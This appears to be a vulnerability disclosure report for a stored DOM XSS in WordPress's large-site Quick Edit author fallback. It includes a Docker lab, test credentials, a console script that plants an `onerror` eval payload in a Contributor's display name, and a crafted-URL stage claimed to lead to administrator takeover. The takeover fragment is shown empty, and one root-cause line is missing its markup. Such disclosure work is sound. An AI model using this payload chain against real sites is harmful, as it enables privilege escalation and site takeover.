title: Large-site Quick Edit reparses a Contributor display name into active HTML
vulnerability_information: On sites with more than 10,000 users, a Contributor can save entity-encoded HTML in their display name. When an administrator opens the attacker's crafted Posts-page URL and clicks **Quick Edit** on the Contributor's pending post, WordPress decodes the stored name with `.text()` and reparses it through jQuery `.prepend()`, causing stored DOM XSS. ## Affected Asset - WordPress Core 7.0.2 - `wp-admin/js/inline-edit-post.js` - Posts list Quick Edit fallback for large user counts ## Preconditions - The site has more than 10,000 users, or `wp_is_large_user_count()` is otherwise forced true. - The attacker has a Contributor account and owns a pending post. - The administrator opens an attacker-supplied Posts-page URL containing the second-stage fragment. - A user with `edit_others_posts` clicks **Quick Edit** on that post. - At exactly 10,000 users, the normal populated author dropdown prevents this branch. ## Docker Setup Save this as `compose.yml`: ```yaml name: wp-quick-edit-large-site-lab services: db: image: mysql:8.4 environment: MYSQL_DATABASE: wordpress_quick_edit MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress MYSQL_ROOT_PASSWORD: root healthcheck: test: ["CMD", "mysqladmin", "ping", "-h", "localhost", "-proot"] interval: 3s timeout: 3s retries: 30 volumes: - quick_edit_db_data:/var/lib/mysql wordpress: image: wordpress:7.0.2-php8.3-apache depends_on: db: condition: service_healthy ports: - "8097:80" environment: WORDPRESS_DB_HOST: db WORDPRESS_DB_NAME: wordpress_quick_edit WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress volumes: - quick_edit_wp_data:/var/www/html cli: image: wordpress:cli-php8.3 depends_on: db: condition: service_healthy wordpress: condition: service_started user: "33:33" environment: WORDPRESS_DB_HOST: db WORDPRESS_DB_NAME: wordpress_quick_edit WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress entrypoint: ["/bin/sh", "-c"] command: - | until [ -f /var/www/html/wp-config.php ] && wp core version >/dev/null 2>&1; do sleep 2; done if ! wp core is-installed >/dev/null 2>&1; then until wp core install --url=http://127.0.0.1:8097 --title='Large Site Quick Edit Lab' --admin_user=admin --admin_password='Admin-Test-9482' --admin_email=admin@example.test --skip-email; do sleep 2; done fi if ! wp user get contributor >/dev/null 2>&1; then wp user create contributor contributor@example.test --role=contributor --user_pass='Contributor-Test-9482' fi wp option update user_count 10001 wp rewrite structure '/%postname%/' --hard volumes: - quick_edit_wp_data:/var/www/html volumes: quick_edit_db_data: quick_edit_wp_data: ``` The `user_count` option models an already-large deployment without creating 10,001 dummy accounts. Start it: ```bash docker compose up -d docker compose logs -f cli ``` Continue after `cli` exits with code `0`. ## Steps To Reproduce 1. Log in at `http://127.0.0.1:8097/wp-admin/` as: ```text Username: contributor Password: Contributor-Test-9482 ``` 2. Open the dashboard console and update the Contributor's own display name: ```javascript const nonce = await fetch(`/wp-admin/admin-ajax.php?action=rest-nonce`).then(r => r.text()); const me = await fetch(`/index.php?rest_route=/wp/v2/users/me&context=edit`, { headers: { "X-WP-Nonce": nonce } }).then(r => r.json()); await fetch(`/index.php?rest_route=/wp/v2/users/${me.id}`, { method: `POST`, headers: { "Content-Type": `application/json`, "X-WP-Nonce": nonce }, body: JSON.stringify({ name: `<img src=x onerror=eval(atob(location.hash.slice(1)))>` }) }); ``` 3. Create any post and click **Submit for Review**. 4. The Contributor sends the administrator this crafted URL. The fragment contains only a harmless title-change marker: ```text http://127.0.0.1:8097/wp-admin/edit.php?post_status=pending&post_type=post#ZG9jdW1lbnQudGl0bGU9J1F1aWNrLUVkaXQtWFNTLTcyMSc= ``` 5. In a separate browser profile, log in as: ```text Username: admin Password: Admin-Test-9482 ``` 6. While authenticated, open the crafted URL from step 4. Do not run anything in the administrator's console. 7. Click **Quick Edit** under the Contributor's post. The browser tab title changes to `Quick-Edit-XSS-721`, confirming execution. Before this click, the author cell contains only text and no active image. 8. To confirm administrator takeover, open this second attacker-supplied URL and click **Quick Edit** on the same post: ```text http://127.0.0.1:8097/wp-admin/edit.php?post_status=pending&post_type=post# ``` The administrator performs no console action. After the Quick Edit click, **Users** contains: ```text Username: h1-quick-edit-admin Password: H1-Quick-Edit-9482! Role: Administrator ``` ## Confirmed Result - WordPress version: 7.0.2 - Contributor self-profile update: HTTP 200 - Pending-post creation: HTTP 201 - Quick Edit author select: `hidden`, zero options - Before Quick Edit: zero active elements - After Quick Edit: tab title `Quick-Edit-XSS-721`, one active element - Takeover requests: GET 200 and POST 302 to `/wp-admin/user-new.php` - Created account role: `administrator` - Temporary automated validation data was removed. ## Root Cause - WordPress preserves valid entities such as `<` in the saved display name. - The Posts list initially renders that value safely as text. - In large-site mode, Quick Edit omits the normal author options. - The fallback reads the author cell through `.text()` and concatenates it into HTML passed to `.prepend()`. - The decoded `` is therefore parsed as a live element. ## Impact - Contributor-controlled JavaScript runs after the administrator opens the crafted link and clicks Quick Edit. - The script can read nonces and perform administrator-only same-origin actions. - The confirmed chain creates a persistent Administrator account.
